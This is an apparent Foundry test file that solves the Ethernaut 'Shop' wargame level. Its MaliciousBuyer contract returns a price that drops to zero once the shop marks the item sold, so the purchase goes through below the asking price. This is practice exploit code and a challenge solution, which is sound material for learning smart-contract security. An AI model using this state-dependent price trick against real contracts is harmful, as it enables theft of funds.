// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Shop.sol";
import "src/levels/ShopFactory.sol";

contract TestShop is BaseTest {
    Shop private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ShopFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Shop(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.isSold(), false);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Solve the Challenge
        MaliciousBuyer maliciousBuyer = new MaliciousBuyer(levelAddress);
        maliciousBuyer.buy();

        // assert that we have solved the challenge
        assertEq(level.isSold(), true);

        vm.stopPrank();
    }
}

contract MaliciousBuyer {
    Shop private level;

    constructor(address _target) public {
        level = Shop(_target);
    }

    function buy() public {
        level.buy();
    }

    function price() external view returns (uint256) {
        return level.isSold() ? 0 : 100;
    }
}